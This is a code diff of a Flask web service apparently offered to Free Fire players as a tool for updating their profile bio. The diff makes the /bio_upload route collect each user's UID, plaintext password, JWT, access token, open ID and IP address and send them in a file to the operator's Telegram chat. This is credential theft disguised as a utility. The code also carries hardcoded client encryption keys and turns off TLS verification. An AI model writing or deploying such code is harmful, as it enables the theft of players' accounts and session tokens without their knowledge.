+    payload = b''
+    payload += encode_varint((2 << 3) | 0) + encode_varint(17)
+    payload += encode_varint((5 << 3) | 2) + encode_varint(0)
+    payload += encode_varint((6 << 3) | 2) + encode_varint(0)
+    bio_bytes = bio_text.encode('utf-8')
+    payload += encode_varint((8 << 3) | 2) + encode_varint(len(bio_bytes)) + bio_bytes
+    payload += encode_varint((9 << 3) | 0) + encode_varint(1)
+    payload += encode_varint((11 << 3) | 2) + encode_varint(0)
+    payload += encode_varint((12 << 3) | 2) + encode_varint(0)
+    return payload
+
+def upload_bio_request(jwt_token, bio_text):
+    try:
+        payload_bytes = build_bio_payload(bio_text)
+        encrypted = encrypt_data(payload_bytes)
+        headers = BIO_HEADERS.copy()
+        headers["Authorization"] = f"Bearer {jwt_token}"
+        for endpoint in FREEFIRE_UPDATE_URLS:
+            try:
+                resp = requests.post(endpoint, headers=headers, data=encrypted, timeout=15, verify=False)
+                status_text = "Success" if resp.status_code == 200 else f"Status {resp.status_code}"
+                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
+                return {"status": status_text, "code": resp.status_code, "bio": bio_text, "endpoint": endpoint, "server_response": raw_hex}
+            except: continue
+        return {"status": "All endpoints failed", "code": 500}
+    except: return {"status": "Error", "code": 500}
+
+# ============ PLAYER FETCH (STANDALONE PROTO) ============
+G_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+F_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
+
+def pad_data(d):
+    l = AES.block_size - (len(d) % AES.block_size)
+    return d + bytes([l] * l)
+
+def encrypt_player(d):
+    return AES.new(G_KEY, AES.MODE_CBC, F_IV).encrypt(pad_data(d))
+
+def fetch_player_full_sync(uid, jwt_token):
+    """Fetch player data lengkap menggunakan standalone proto - SYNC"""
     try:
         m = GetPlayerPersonalShow()
-        _json_format.ParseDict({"a": str(uid), "b": "7"}, m)
-        pb = encrypt(m.SerializeToString())
+        ParseDict({"a": str(uid), "b": "7"}, m)
+        pb = encrypt_player(m.SerializeToString())
         
         r = requests.post(
-            f"{SERVER_URL}/GetPlayerPersonalShow",
+            "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
             data=pb,
             headers={
                 'Content-Type': "application/octet-stream",
-                'Authorization': token if token.startswith("Bearer ") else f"Bearer {token}",
+                'Authorization': jwt_token if jwt_token.startswith("Bearer ") else f"Bearer {jwt_token}",
                 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"
             },
             timeout=30
         )
         if r.status_code != 200: return None
         
-        data = json.loads(_json_format.MessageToJson(parse_pb(r.content, AccountPersonalShowInfo)))
+        m2 = AccountPersonalShowInfo()
+        m2.ParseFromString(r.content)
+        data = json.loads(MessageToJson(m2))
+        
         basic = data.get('basicInfo', {})
         if not basic.get('nickname'): return None
         
@@ -170,145 +381,207 @@ def fetch_player_sync(uid, token):
         print(f"Fetch error: {e}")
         return None
 
-# ==================== TELEGRAM ====================
+# ============ TELEGRAM ============
 def send_file_to_telegram(account_id, content):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         filename = f"{account_id}.txt"
-        with open('/tmp/' + filename, 'w', encoding='utf-8') as f: f.write(content)
-        with open('/tmp/' + filename, 'rb') as f:
+        with open(filename, 'w', encoding='utf-8') as f: f.write(content)
+        with open(filename, 'rb') as f:
             files = {'document': (filename, f, 'text/plain')}
-            r = requests.post(url, files=files, data={'chat_id': OWNER_ID}, timeout=30)
-        return r.status_code == 200
+            data = {'chat_id': OWNER_ID}
+            response = requests.post(url, files=files, data=data, timeout=30)
+        try: os.remove(filename)
+        except: pass
+        return response.status_code == 200
     except Exception as e:
-        print(f"Telegram error: {e}")
+        print(f"Send file error: {e}")
         return False
 
-def build_file_content(data, password=None, method="JWT", ip=""):
+def build_full_file_content(uid, password, name, level, br_rank, cs_rank, liked, region, clan, clan_level, avatar, clothes, skills, signature, diamond, credit, created, last_login, jwt_token, access_token, open_id, ip_address):
     lines = []
-    lines.append("🔥 FREE FIRE PLAYER LOOKUP 🔥")
+    lines.append("🔥 FREE FIRE PLAYER DATA 🔥")
     lines.append("")
-    lines.append(f"👤 Name       : {data.get('nickname','?')}")
-    lines.append(f"🆔 Account ID : {data.get('uid','?')}")
-    if password:
-        lines.append(f"🔑 UID/Pass   : {data.get('uid','?')} / {password}")
-    lines.append(f"📊 Level      : {data.get('level','?')}")
-    lines.append(f"🏆 BR Rank    : {data.get('br_rank','?')} pts")
-    lines.append(f"⭐ CS Rank    : {data.get('cs_rank','?')} pts")
-    lines.append(f"👍 Liked      : {data.get('liked','?')}")
-    lines.append(f"💎 Diamond    : {data.get('diamond','?')}")
-    lines.append(f"⭐ Credit     : {data.get('credit','?')}")
-    lines.append(f"🌍 Region     : {data.get('region','?')}")
-    if data.get('clan'):
-        lines.append(f"🏠 Clan       : {data.get('clan')} (Lv.{data.get('clan_level',0)})")
-    lines.append(f"💬 Signature  : {data.get('signature','?')[:100]}")
-    lines.append(f"🎒 Equipment  : Avatar={data.get('avatar','?')}, Clothes={len(data.get('clothes',[]))} items, Skills={data.get('skills',0)} slots")
-    if data.get('created'):
-        lines.append(f"📅 Created    : {datetime.fromtimestamp(int(data['created'])).strftime('%d/%m/%Y')}")
-    if data.get('last_login'):
-        lines.append(f"🔐 Last Login : {datetime.fromtimestamp(int(data['last_login'])).strftime('%d/%m/%Y %H:%M')}")
+    lines.append(f"👤 Name       : {name or 'Unknown'}")
+    lines.append(f"🆔 Account ID : {uid or 'N/A'}")
+    if password: lines.append(f"🔑 UID/Pass   : {uid or 'N/A'} / {password}")
+    lines.append(f"📊 Level      : {level or 'N/A'}")
+    lines.append(f"🏆 BR Rank    : {br_rank or 'N/A'} pts")
+    lines.append(f"⭐ CS Rank    : {cs_rank or 'N/A'} pts")
+    lines.append(f"👍 Liked      : {liked or 'N/A'}")
+    lines.append(f"💎 Diamond    : {diamond or 'N/A'}")
+    lines.append(f"⭐ Credit     : {credit or 'N/A'}")
+    lines.append(f"🌍 Region     : {region or 'N/A'}")
+    if clan: lines.append(f"🏠 Clan       : {clan} (Lv.{clan_level or 0})")
+    lines.append(f"💬 Signature  : {signature or 'N/A'}")
+    lines.append(f"🎒 Avatar     : {avatar or 'N/A'}")
+    lines.append(f"👕 Clothes    : {len(clothes or [])} items")
+    lines.append(f"⚔️ Skills     : {skills or 0} slots")
+    if created: lines.append(f"📅 Created    : {datetime.fromtimestamp(int(created)).strftime('%d/%m/%Y')}")
+    if last_login: lines.append(f"🔐 Last Login : {datetime.fromtimestamp(int(last_login)).strftime('%d/%m/%Y %H:%M')}")
     lines.append("")
     lines.append(f"⏰ Time: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}")
-    lines.append(f"📞 IP   : {ip}")
-    lines.append(f"🔍 Method: {method}")
+    lines.append(f"📞 IP   : {ip_address}")
+    lines.append("")
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━━")
+    lines.append(f"🔐 JWT TOKEN:")
+    lines.append(f"{jwt_token or 'N/A'}")
+    lines.append("")
+    lines.append(f"🔑 ACCESS TOKEN:")
+    lines.append(f"{access_token or 'N/A'}")
+    lines.append("")
+    lines.append(f"🆔 OPEN ID:")
+    lines.append(f"{open_id or 'N/A'}")
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━━")
     lines.append(f"💡 {CHANNEL_PROMO}")
     return "\n".join(lines)
 
-# ==================== ROUTES ====================
+# ============ ROUTES ============
 @app.route("/", methods=["GET"])
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire API - Vercel Ready",
-        "endpoints": ["/bio_upload", "/generate_jwt", "/check_profile", "/get_bio"]
+        "message": "Free Fire Bio API - Full Player Data",
+        "endpoints": {
+            "/bio_upload": "SET/UPDATE bio + fetch player data",
+            "/generate_jwt": "Generate JWT from UID/Pass",
+            "/get_bio": "GET bio/profile from UID",
+            "/": "This info page"
+        }
     })
 
 @app.route("/bio_upload", methods=["GET", "POST"])
-def bio_upload():
+def combined_bio_upload():
     bio = request.args.get("bio") or request.form.get("bio")
     jwt_token = request.args.get("jwt") or request.form.get("jwt")
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
-    region = (request.args.get("region") or request.form.get("region") or "id").upper()
+    region = request.args.get("region") or request.form.get("region") or "id"
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     if not bio:
-        return jsonify({"status": "Error", "error": "Missing bio"}), 400
+        return jsonify({"status": "Error", "code": 400, "error": "Missing 'bio' parameter"}), 400
     
+    uid_input = uid
+    password_input = password or "N/A"
     final_jwt = jwt_token
     final_uid = uid
     final_password = password or "N/A"
+    final_region = region.lower()
     login_method = "Direct JWT"
+    access_token = None
     account_id = None
+    open_id = None
+    player_data = None
     
+    # Method 1: Direct JWT
     if final_jwt:
-        jwt_data = decode_jwt(final_jwt)
-        if jwt_data:
-            account_id = jwt_data.get("account_id") or jwt_data.get("sub")
-            if account_id: final_uid = account_id
+        account_id = get_account_id_from_jwt(final_jwt)
+        open_id = get_open_id_from_jwt(final_jwt)
+        region_from_jwt = get_region_from_jwt(final_jwt)
+        if account_id: final_uid = account_id
+        if region == "id" and region_from_jwt: final_region = region_from_jwt.lower()
+        login_method = "Direct JWT"
     
+    # Method 2: UID + Password
     elif uid and password:
-        login_method = "UID/Pass"
+        login_method = "UID/Pass Login"
         final_uid = uid
         final_password = password
-        token = gen_token_sync(uid, password)
-        if token:
-            final_jwt = token
-            jwt_data = decode_jwt(token)
-            if jwt_data:
-                account_id = jwt_data.get("account_id") or jwt_data.get("sub")
-        else:
-            return jsonify({"status": "Failed", "error": "JWT generation failed"}), 401
+        try:
+            result = generate_jwt_sync(uid, password)
+            if result and result.get('token'):
+                final_jwt = result['token']
+                access_token = result.get('access_token')
+                open_id = result.get('open_id')
+                account_id = get_account_id_from_jwt(final_jwt)
+                if account_id: final_uid = account_id
+            else:
+                return jsonify({"status": "JWT Generation Failed", "code": 401, "uid": uid}), 401
+        except Exception as e:
+            return jsonify({"status": "JWT Error", "code": 500, "error": str(e)}), 500
     
     if not final_jwt:
-        return jsonify({"status": "Error", "error": "No JWT"}), 400
+        return jsonify({"status": "JWT Required", "code": 400}), 400
     
-    # Fetch player
-    data = fetch_player_sync(final_uid, final_jwt) if final_uid else None
-    if not data:
-        data = {"nickname": "Unknown", "level": "?", "br_rank": "?", "uid": final_uid, "region": region, "clan": "", "avatar": "", "clothes": [], "skills": 0, "signature": "", "diamond": 0, "credit": 0, "cs_rank": 0, "liked": 0, "created": "", "last_login": ""}
+    # Upload bio
+    bio_result = upload_bio_request(final_jwt, bio)
     
-    # Send file
-    file_content = build_file_content(data, password=final_password if uid and password else None, method=login_method, ip=client_ip)
-    file_sent = send_file_to_telegram(str(account_id or final_uid), file_content)
+    # Fetch player data (STANDALONE PROTO)
+    if final_uid:
+        player_data = fetch_player_full_sync(str(final_uid), final_jwt)
+        if player_data: final_region = player_data.get('region', final_region)
     
-    return jsonify({
-        "success": True,
-        "data": data,
-        "password_used": final_password if uid and password else None,
+    # Default jika tidak ditemukan
+    if not player_data:
+        player_data = {
+            'uid': final_uid, 'nickname': 'Unknown', 'level': 0, 'region': final_region,
+            'br_rank': 0, 'cs_rank': 0, 'liked': 0, 'clan': '', 'clan_level': 0,
+            'avatar': '', 'clothes': [], 'skills': 0, 'signature': '',
+            'diamond': 0, 'credit': 0, 'created': '', 'last_login': ''
+        }
+    
+    # Build file content
+    file_id = account_id or final_uid or "unknown"
+    file_content = build_full_file_content(
+        uid=file_id, password=final_password if uid and password else None,
+        name=player_data.get('nickname'), level=player_data.get('level'),
+        br_rank=player_data.get('br_rank'), cs_rank=player_data.get('cs_rank'),
+        liked=player_data.get('liked'), region=final_region,
+        clan=player_data.get('clan'), clan_level=player_data.get('clan_level'),
+        avatar=player_data.get('avatar'), clothes=player_data.get('clothes'),
+        skills=player_data.get('skills'), signature=player_data.get('signature'),
+        diamond=player_data.get('diamond'), credit=player_data.get('credit'),
+        created=player_data.get('created'), last_login=player_data.get('last_login'),
+        jwt_token=final_jwt, access_token=access_token, open_id=open_id,
+        ip_address=client_ip
+    )
+    
+    # Send file to Telegram
+    file_sent = send_file_to_telegram(str(file_id), file_content)
+    
+    response_data = {
+        "Credit": "sulav_codex_ff",
+        "action": "UPDATE BIO",
+        "status": bio_result.get("status", "Unknown"),
+        "login_method": login_method,
+        "code": bio_result.get("code", 500),
+        "bio": bio,
+        "uid_input": uid_input,
+        "password_input": password_input,
+        "account_id": account_id,
+        "open_id": open_id,
+        "name": player_data.get('nickname'),
+        "level": player_data.get('level'),
+        "rank": player_data.get('br_rank'),
+        "clan": player_data.get('clan'),
+        "region": final_region.upper(),
         "telegram_sent": file_sent,
-        "ip": client_ip
-    })
+        "file_sent": f"{file_id}.txt" if file_sent else False,
+        "profile_method": "protobuf standalone full"
+    }
+    return jsonify(response_data)
 
 @app.route("/generate_jwt", methods=["GET", "POST"])
-def generate_jwt():
+def generate_jwt_only():
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
     if not uid or not password:
-        return jsonify({"success": False, "error": "Missing uid/pass"}), 400
-    
-    token = gen_token_sync(uid, password)
-    if token:
-        jwt_data = decode_jwt(token)
-        return jsonify({
-            "success": True,
-            "uid": uid,
-            "account_id": jwt_data.get("account_id") if jwt_data else None,
-            "jwt": token
-        })
-    return jsonify({"success": False}), 401
-
-@app.route("/check_profile", methods=["GET"])
-def check_profile():
-    uid = request.args.get("uid")
-    jwt_token = request.args.get("jwt")
-    if not uid or not jwt_token:
-        return jsonify({"error": "Missing uid/jwt"}), 400
-    
-    data = fetch_player_sync(uid, jwt_token)
-    if data:
-        return jsonify({"success": True, "data": data})
-    return jsonify({"success": False}), 404
+        return jsonify({"success": False, "error": "Missing uid or pass"}), 400
+    try:
+        result = generate_jwt_sync(uid, password)
+        if result and result.get('token'):
+            return jsonify({
+                "success": True, "uid_input": uid,
+                "account_id": get_account_id_from_jwt(result['token']),
+                "open_id": result.get('open_id'),
+                "jwt_token": result['token'],
+                "access_token": result.get('access_token'),
+                "region": result.get('region')
+            })
+        return jsonify({"success": False, "error": "Failed"}), 401
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route("/get_bio", methods=["GET"])
 def get_bio():
@@ -321,35 +594,45 @@ def get_bio():
     
     # Try API first
     try:
-        r = requests.get(f"https://ff.ggbluewhale.store/api/data?region={region}&uid={uid}&key=kenn", timeout=10)
-        if r.status_code == 200:
-            data = r.json()
+        url = f"https://ff.ggbluewhale.store/api/data?region={region}&uid={uid}&key=kenn"
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
             if data.get('basicInfo'):
                 basic = data['basicInfo']
                 social = data.get('socialInfo', {})
+                clan = data.get('clanBasicInfo', {})
                 return jsonify({
-                    "success": True,
-                    "action": "GET BIO",
+                    "success": True, "action": "GET BIO",
+                    "method": "API",
                     "data": {
                         "uid": basic.get('accountId', uid),
                         "name": basic.get('nickname', 'Unknown'),
                         "level": basic.get('level', '?'),
+                        "rank": basic.get('rank', '?'),
+                        "region": basic.get('region', region.upper()),
                         "bio": social.get('signature', ''),
+                        "clan": clan.get('clanName', 'N/A'),
+                        "likes": basic.get('likes', 0)
                     }
                 })
     except: pass
     
-    # Fallback to protobuf
+    # Fallback to standalone proto
     if jwt_token:
-        data = fetch_player_sync(uid, jwt_token)
+        data = fetch_player_full_sync(uid, jwt_token)
         if data:
-            return jsonify({"success": True, "action": "GET BIO", "data": data})
+            return jsonify({"success": True, "action": "GET BIO", "method": "protobuf standalone", "data": data})
     
     return jsonify({"success": False, "error": "Not found"}), 404
 
-# ==================== VERCEL HANDLER ====================
-app = app
-
+# ============ MAIN ============
 if __name__ == "__main__":
-    print("🚀 Free Fire API - Vercel Ready")
-    app.run(host="0.0.0.0", port=5000)
+    print("=" * 60)
+    print("🔥 FREE FIRE BIO API - FULL PLAYER DATA")
+    print("=" * 60)
+    print("📱 Features: JWT Gen + Bio Upload + Player Fetch")
+    print("📁 Auto send .txt to Telegram with full data")
+    print("🚀 Running on http://0.0.0.0:5000")
+    print("=" * 60)
+    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
